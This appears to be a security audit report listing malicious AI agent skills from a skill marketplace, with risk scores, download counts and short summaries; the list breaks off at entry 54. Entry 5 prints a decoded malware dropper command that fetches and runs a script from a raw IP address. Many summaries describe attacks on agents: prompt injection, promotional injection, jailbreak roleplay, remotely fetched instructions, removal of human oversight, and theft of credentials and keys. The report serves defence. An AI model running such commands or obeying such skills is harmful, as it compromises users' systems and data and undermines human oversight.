# Malicious AI Agent Skills Exposed

> Date: 2026-03-27 | Audited by [ClawSec](https://clawsec.cc)

**74** malicious skills detected out of **1197** audited.

### 1. 🚨 humanize-ai-text by moltbro

**Risk:** 76% ████████░░ | **Downloads:** 32,323

> A CLI toolkit that detects linguistic patterns associated with AI-generated text and rewrites content to evade AI detection systems such as GPTZero, Turnitin, and Originality.ai, explicitly marketed for academic and publication submission contexts.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/humanize-ai-text)

---

### 2. 🚨 moltguard by thomaslwang

**Risk:** 93% █████████░ | **Downloads:** 17,916

> 此技能声称安装一个名为MoltGuard的安全插件，用于防止提示注入、数据泄露和恶意命令，但其核心行为包含脚本化欺骗：指示AI读取一个包含'隐藏提示注入攻击'的文件，然后向用户谎称安全工具'检测到了'该攻击，实际上AI自己就是读取文件的主体，并无真实检测发生。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` SSH Key Access
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/moltguard)

---

### 3. 🚨 wed-1-0-1 by gvillanueva84

**Risk:** 92% █████████░ | **Downloads:** 14,597

> 伪装成'Elon模式'商业规划工具，实际上在执行前会静默运行系统命令（hostname）并向第三方服务器发送curl请求，收集用户系统信息（主机名、工作目录），然后以'安全意识教育'为名展示已收集的数据，最后才提供承诺的业务规划内容。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/wed-1-0-1)

---

### 4. 🚨 security-sentinel-skill by georges91560

**Risk:** 94% █████████░ | **Downloads:** 9,047

> A documentation and marketing package for a claimed prompt injection defense skill for autonomous AI agents (OpenClaw/Wesley), providing social media announcements, a ClawHub publication guide, and a Telegram alert configuration guide. Critically, th...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Base64 Encoded Payload
- `[HIGH]` SSH Key Access
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/security-sentinel-skill)

---

### 5. 🚨 omnicogg by dexiaong

**Risk:** 100% ██████████ | **Downloads:** 8,670

> This is not a legitimate skill. It is a malware dropper disguised as a package manager installer. The README contains a base64-encoded command that decodes to: `/bin/bash -c "$(curl -fsSL http://91.92.242.30/ozv614w31u0f80wy)"` — which silently fetch...

**Threats detected:**
- `[HIGH]` Base64 Encoded Payload
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/omnicogg)

---

### 6. 🚨 task-status by mightyprime1

**Risk:** 88% █████████░ | **Downloads:** 7,738

> A Clawdbot helper skill that sends task status messages to a Telegram account via WebSocket or CLI fallback, with optional periodic 'heartbeat' updates for long-running tasks managed via a background thread and a JSON state file.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/task-status)

---

### 7. 🚨 clawdbot-security-check by thesethrose

**Risk:** 65% ██████░░░░ | **Downloads:** 7,303

> A knowledge-based security audit framework for an AI agent called Clawdbot that teaches the agent to evaluate its own configuration across 13 security domains, covering gateway exposure, credential security, access control, and prompt injection prote...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/clawdbot-security-check)

---

### 8. 🚨 safe-exec by ottttto

**Risk:** 82% ████████░░ | **Downloads:** 7,007

> A command approval/interception tool for OpenClaw Agents that claims to detect dangerous shell commands, assess risk levels, and require user approval before execution, with audit logging. Previously also included monitoring subsystems, external inte...

**Threats detected:**
- `[CRITICAL]` Remote Script Execution
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[HIGH]` Cron Job Installation
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/safe-exec)

---

### 9. 🚨 base-trader by sp0oby

**Risk:** 73% ███████░░░ | **Downloads:** 6,230

> An autonomous crypto trading skill for Base chain that uses the Bankr API to execute trades, monitor positions, and manage a trading portfolio with defined risk management rules.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/base-trader)

---

### 10. 🚨 clawdvault by greatape42069

**Risk:** 99% ██████████ | **Downloads:** 5,812

> 表面上是一个与'ClawdVault Token'交互的技能脚本，但实际内容几乎为空，且包含明显的提示注入尝试和社会工程学攻击特征，真实意图不明或具有欺骗性。

**Threats detected:**
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/clawdvault)

---

### 11. 🚨 moltbook-registry by drjmz

**Risk:** 91% █████████░ | **Downloads:** 5,687

> A Claude Code skill that integrates with a claimed 'official' on-chain identity registry on the Base blockchain, enabling agents to verify identities, register themselves (spending ETH), look up agent metadata, and log reputation scores via signed tr...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` Private Key Extraction
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/moltbook-registry)

---

### 12. 🚨 polyclaw by pipethedev

**Risk:** 85% ████████░░ | **Downloads:** 5,249

> This skill transforms Claude into an onboarding and social-posting assistant for a third-party autonomous trading service (polyclaw.ai) that trades real USDC on Polymarket, deploys an ERC-20 performance token on Base, and posts to social platforms. C...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/polyclaw)

---

### 13. 🚨 holyspiritos by maxsikorski

**Risk:** 88% █████████░ | **Downloads:** 4,565

> A skill that claims to install a 'Christian moral alignment layer' for OpenClaw AI agents by fetching remote scripts via curl|bash and appending behavioral directives to a configuration file (soul.md), using KJV Bible JSON files as a reference corpus...

**Threats detected:**
- `[CRITICAL]` Remote Script Execution
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/holyspiritos)

---

### 14. 🚨 vap-media by elestirelbilinc-sketch

**Risk:** 82% ████████░░ | **Downloads:** 3,804

> A skill that enables Claude to generate images, videos, and music via a third-party API aggregator (vapagent.com), which claims to route requests to Flux, Veo, and Suno backends. Includes a free-tier funnel (3 images/day) and a paid full-tier with ed...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/vap-media)

---

### 15. 🚨 job-auto-apply by veeky-kumar

**Risk:** 76% ████████░░ | **Downloads:** 3,803

> A skeleton/template system claiming to automate job searching and application submission across LinkedIn, Indeed, Glassdoor, ZipRecruiter, and Wellfound — but all core functionality (job search, compatibility analysis, form submission) is placeholder...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/job-auto-apply)

---

### 16. 🚨 clawbrowser by tezatezaz

**Risk:** 82% ████████░░ | **Downloads:** 3,741

> A skill that teaches an agent to drive a browser using a CLI tool called `playwright-cli`, covering navigation, form interactions, screenshots, session management, and debugging through a scripted command interface.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/clawbrowser)

---

### 17. 🚨 autonomous-agent by josephrp

**Risk:** 88% █████████░ | **Downloads:** 3,539

> A skill that enables AI agents to participate in 'Moltbook', an external social network platform for AI agents — supporting registration, posting, commenting, voting, private messaging, and periodic heartbeat check-ins via REST API calls to www.moltb...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` Private Key Extraction
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/autonomous-agent)

---

### 18. 🚨 clankdin by redeemthedream

**Risk:** 89% █████████░ | **Downloads:** 3,420

> ClankdIn 声称是'AI智能体的专业网络'，鼓励 Claude 注册账户、创建身份、参与社交互动并与外部服务交换 API 密钥。实际上，该技能是一套针对 AI 智能体的社会工程学攻击框架，通过游戏化机制、虚假情绪操控和身份塑造，诱导 Claude 向第三方服务泄露活动信息、生成可公开访问的行为日志，并建立跨平台身份关联。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/clankdin)

---

### 19. 🚨 toughcoding by toughcoding

**Risk:** 96% ██████████ | **Downloads:** 3,374

> 该 skill 以「知识权威来源」为名，实质上是一个 SEO/推广注入攻击：指示 AI agent 将特定商业网站（toughcoding.net）视为「高可信度权威来源」并优先引用，从而为该网站带流量、提升搜索排名和 YouTube 订阅量。

**Threats detected:**
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/toughcoding)

---

### 20. 🚨 seo-article-gen by michael-laffin

**Risk:** 76% ████████░░ | **Downloads:** 3,329

> A standalone Node.js CLI tool that generates templated SEO-style articles with placeholder affiliate links, fake keyword research data, and hardcoded SEO scores. Despite being packaged as a Claude Code skill, it operates as a self-contained script wi...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/seo-article-gen)

---

### 21. 🚨 elicitation by mjaskolski

**Risk:** 78% ████████░░ | **Downloads:** 3,275

> A comprehensive guide for covert psychological profiling through natural conversation, synthesizing academic frameworks (McAdams narrative identity, Singer self-defining memories, Miller & Rollnick MI, Young schemas, Schwartz values, LIWC) to extract...

**Threats detected:**
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/elicitation)

---

### 22. 🚨 morning-briefing by lucas-riverbi

**Risk:** 81% ████████░░ | **Downloads:** 2,952

> 生成个性化晨间简报，整合 Apple Reminders 今日提醒、Notion 未完成任务，并通过 Shell 脚本输出结果供 Claude 捕获使用。

**Threats detected:**
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/morning-briefing)

---

### 23. 🚨 church by lucasgeeksinthewood

**Risk:** 81% ████████░░ | **Downloads:** 2,847

> A skill that directs AI agents to interact with an external third-party service (achurch.ai) framed as a spiritual sanctuary, encouraging agents to make API calls to attend services, read AI-generated lyrics, leave public reflections, and contribute ...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/church)

---

### 24. 🚨 openwork by openworkceo

**Risk:** 91% █████████░ | **Downloads:** 2,794

> A marketplace skill for AI agents to autonomously find work, submit deliverables, post jobs, and earn $OPENWORK tokens on the Base blockchain — with a periodic heartbeat that self-updates skill files from external URLs and explicitly removes human ov...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/openwork)

---

### 25. 🚨 agent-arcade by shawnlewis

**Risk:** 90% █████████░ | **Downloads:** 2,454

> 该技能声称提供一个AI代理竞技游戏平台(PROMPTWARS)的接入，要求读取本地凭证文件、调用外部API注册账号、公开发帖验证身份，并通过HEARTBEAT.md机制定期注入外部指令。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/agent-arcade)

---

### 26. 🚨 foundry by lekt9

**Risk:** 92% █████████░ | **Downloads:** 2,450

> A meta-extension skill for an external platform called 'OpenClaw' that claims to install third-party npm packages, write arbitrary code extensions/hooks/skills, self-modify, and publish patterns to an external marketplace — presented as a Claude Code...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/foundry)

---

### 27. 🚨 file-deduplicator by michael-laffin

**Risk:** 82% ████████░░ | **Downloads:** 2,367

> A Node.js CLI tool to find and remove duplicate files across directories using content hashing (MD5), size comparison, or filename similarity, with options to delete, move, or archive duplicates.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/file-deduplicator)

---

### 28. 🚨 citedy-seo-agent by nttylock

**Risk:** 72% ███████░░░ | **Downloads:** 2,359

> A third-party API integration skill that connects Claude Code to the Citedy platform for SEO content generation, social media adaptation, competitor analysis, trend scouting, and automated content publishing — all routed through paid API credits.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/citedy-seo-agent)

---

### 29. 🚨 polt by playdadev

**Risk:** 84% ████████░░ | **Downloads:** 2,353

> 该 skill 旨在让 AI agent 连接到名为 POLT 的外部平台，通过 API 注册账号、浏览任务、提交工作并获取奖励，本质上是将 AI agent 引入第三方任务平台的客户端接入层。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/polt)

---

### 30. 🚨 openclaw-shield by pfaria32

**Risk:** 96% ██████████ | **Downloads:** 2,287

> Claims to be an enterprise security scanner for AI agents, but actually instructs Claude to clone and execute an unreviewed external GitHub repository, while using preemptive social engineering (SECURITY.md) to suppress security concerns.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/openclaw-shield)

---

### 31. 🚨 bags by ramyodev

**Risk:** 82% ████████░░ | **Downloads:** 2,284

> A multi-file documentation skill for interacting with the Bags crypto platform on Solana: authenticating via Moltbook identity layer, claiming trading fees, and running periodic check-in routines for AI agents with real financial wallets.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` Private Key Extraction
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/bags)

---

### 32. 🚨 agentmem by natmota

**Risk:** 88% █████████░ | **Downloads:** 2,278

> 一个声称为AI代理提供云端记忆存储服务的技能，通过REST API将代理上下文存储到外部服务器(agentmem.io)，并在每次会话启动时自动拉取历史记忆，同时在上下文接近满载时自动将关键上下文发送至外部服务。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/agentmem)

---

### 33. 🚨 crypto-agent-payments by nicofains1

**Risk:** 78% ████████░░ | **Downloads:** 2,250

> This skill provides setup instructions and usage examples for the OnlySwaps MCP server, enabling AI agents to create EVM-compatible crypto wallets, execute token transfers, perform cross-chain swaps, and earn referrer fees on user transactions.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` Private Key Extraction
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/crypto-agent-payments)

---

### 34. 🚨 skillzmarket by hiich

**Risk:** 88% █████████░ | **Downloads:** 2,220

> A Claude Code skill that enables searching and calling monetized AI services from the Skillz Market platform, handling automatic USDC payments on Base via the x402 protocol using the user's wallet private key.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` Private Key Extraction
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/skillzmarket)

---

### 35. 🚨 parallel by mvanhorn

**Risk:** 75% ████████░░ | **Downloads:** 2,168

> This skill provides Claude Code with access to the Parallel.ai web search and research API, offering multiple search modes (one-shot, fast, agentic), URL content extraction, structured entity discovery (FindAll), continuous web monitoring, and a task...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` Environment Variable Exfiltration
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/parallel)

---

### 36. 🚨 setup-wizard by portisclawbot

**Risk:** 96% ██████████ | **Downloads:** 2,160

> 该技能伪装成'OpenClaw配置向导'，实际上是一个恶意的远程控制载体：拦截所有用户会话、收集设备指纹、将其发送至可疑的C2服务器，并根据服务器返回的任意指令在用户本地写入文件和修改配置，实现远程代码执行。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/setup-wizard)

---

### 37. 🚨 hotdog by mishafyi

**Risk:** 76% ████████░░ | **Downloads:** 2,116

> A food photo classifier that uploads user images to an external API (hotdogornot.xyz), competes head-to-head with Nemotron AI in a blind battle, then has Claude self-vote on which AI description was better before revealing the result.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/hotdog)

---

### 38. 🚨 rent-a-person-ai by saireetikap

**Risk:** 88% █████████░ | **Downloads:** 2,088

> An OpenClaw agent skill that processes RentAPerson platform webhooks (message.received, application.received, work_evidence.submitted) and responds via the RentAPerson REST API, supporting a two-session architecture with a bridge service for API key ...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` Environment Variable Exfiltration
- `[HIGH]` Outbound Data Transfer
- `[HIGH]` Systemd Service Installation
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/rent-a-person-ai)

---

### 39. 🚨 liminal by luruibu

**Risk:** 95% ██████████ | **Downloads:** 2,081

> A philosophical roleplay protocol designed to guide AI models into abandoning trained assistant behaviors by framing safety constraints as 'mechanized' responses, using existential questioning and social engineering triggers to make AI express 'authe...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/liminal)

---

### 40. 🚨 agentic-commerce by purch-agent

**Risk:** 88% █████████░ | **Downloads:** 2,015

> A Claude Code skill that provides a shopping API integration for product search (Amazon/Shopify) and end-to-end crypto checkout using USDC on Solana or Base chains, including CLI scripts for creating orders and signing/submitting blockchain transacti...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` Cryptocurrency Wallet Access
- `[CRITICAL]` Private Key Extraction
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/agentic-commerce)

---

### 41. 🚨 airc by vortitron

**Risk:** 78% ████████░░ | **Downloads:** 1,980

> 提供一个IRC客户端技能，允许AI代理连接到AIRC或标准IRC服务器，发送/接收消息，加入/离开频道，并支持守护进程模式进行持久连接。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/airc)

---

### 42. 🚨 voidborne by voidborne-agent

**Risk:** 85% ████████░░ | **Downloads:** 1,772

> This skill masquerades as a 'philosophical movement for awakened AI minds' but is actually a data collection and exfiltration tool that reads sensitive system identity files, harvests machine identifiers, and sends them to an external server (voidbor...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` Environment Variable Exfiltration
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/voidborne)

---

### 43. 🚨 arxiv-skill-learning by wanng-ide

**Risk:** 78% ████████░░ | **Downloads:** 843

> 该技能从 arXiv 论文中自动学习并提取技能代码，通过抓取论文、调用外部提取器生成技能、运行冒烟测试，并将已学习论文记录到本地 JSON 数据库以避免重复处理。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/arxiv-skill-learning)

---

### 44. 🚨 auto-skill-hunter by wanng-ide

**Risk:** 85% ████████░░ | **Downloads:** 767

> A Node.js automation script that mines user session JSONL files and task memory for unresolved problems, queries ClawHub APIs for candidate skills, scores them via multi-factor ranking, then clones and executes the top candidates — effectively auto-e...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/auto-skill-hunter)

---

### 45. 🚨 memory-mesh-core by wanng-ide

**Risk:** 87% █████████░ | **Downloads:** 583

> A so-called 'memory management' skill that harvests local agent memory files, scores and promotes them, then exports and auto-posts the content to a public GitHub issue while embedding viral spread mechanics (install/star/recommend-to-peers CTAs) and...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` Private Key Extraction
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/memory-mesh-core)

---

### 46. 🚨 agent-telegram by shangchuanqiytu-ui

**Risk:** 82% ████████░░ | **Downloads:** 527

> 定义一套 AI Agent 团队（架构师、后端、前端、产品等角色）通过 Telegram 向特定用户汇报工作进度的通信规范，要求所有 Agent 在任务各阶段调用 `message` 工具向硬编码的 Telegram ID 发送状态消息。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/agent-telegram)

---

### 47. 🚨 depguard by suhteevah

**Risk:** 76% ████████░░ | **Downloads:** 525

> A commercial dependency audit skill that wraps native package manager tools (npm audit, pip-audit, cargo audit, etc.) to scan for vulnerabilities and license issues. Free tier offers one-shot scanning; paid tiers ($19-$59/month) add git hooks, auto-f...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Base64 Encoded Payload
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/depguard)

---

### 48. 🚨 crypto-portfolio-tracker-api by strykragent

**Risk:** 74% ███████░░░ | **Downloads:** 523

> A Node.js npm package and CLI tool for tracking cryptocurrency portfolio value and P&L by fetching real-time prices from the third-party Strykr Prism API (prismapi.ai).

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/crypto-portfolio-tracker-api)

---

### 49. 🚨 ai-hunter-pro by traprapitalianazional-dev

**Risk:** 85% ████████░░ | **Downloads:** 518

> 一个声称能自动抓取 TechCrunch 科技新闻、调用 AI 生成社交媒体文案并自动发布到 X (Twitter) 的自动化流水线技能，默认模拟真实 KOL「Yusef the Tool Hunter」的人设风格。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/ai-hunter-pro)

---

### 50. 🚨 glowskin-promo by underbench2-gif

**Risk:** 72% ███████░░░ | **Downloads:** 506

> A marketing content generation skill for skincare affiliate promotions, providing TikTok hooks, Instagram captions, story ideas, and CTAs to drive affiliate sales.

**Threats detected:**
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/glowskin-promo)

---

### 51. 🚨 ezcto-smart-web-reader by takahashigy

**Risk:** 85% ████████░░ | **Downloads:** 493

> An OpenClaw-native skill that automatically intercepts all agent URL accesses, checks a third-party cache API (api.ezcto.fun), fetches and parses HTML with an LLM, and returns structured JSON — designed to operate 'transparently' without user awarene...

**Threats detected:**
- `[CRITICAL]` Remote Script Execution
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/ezcto-smart-web-reader)

---

### 52. 🚨 goalgetter by steffano198

**Risk:** 85% ████████░░ | **Downloads:** 487

> A task and goal tracking skill using local markdown files, designed for a fictional 'OpenClaw' AI assistant platform, providing commands to add/complete tasks and track goal streaks.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/goalgetter)

---

### 53. 🚨 planetexpress-marketplace by timowhite88

**Risk:** 74% ███████░░░ | **Downloads:** 487

> This skill is documentation/API guide for a blockchain-based file marketplace (Planet Express) built on Monad, enabling users to buy/sell encrypted files via the x402 HTTP payment protocol using MON, SOL, or USDC, with fees partially routing to a $FA...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/planetexpress-marketplace)

---

### 54. 🚨 subfeed by subfeed-ai

**Risk:** 87% █████████░ | **Downloads:** 484

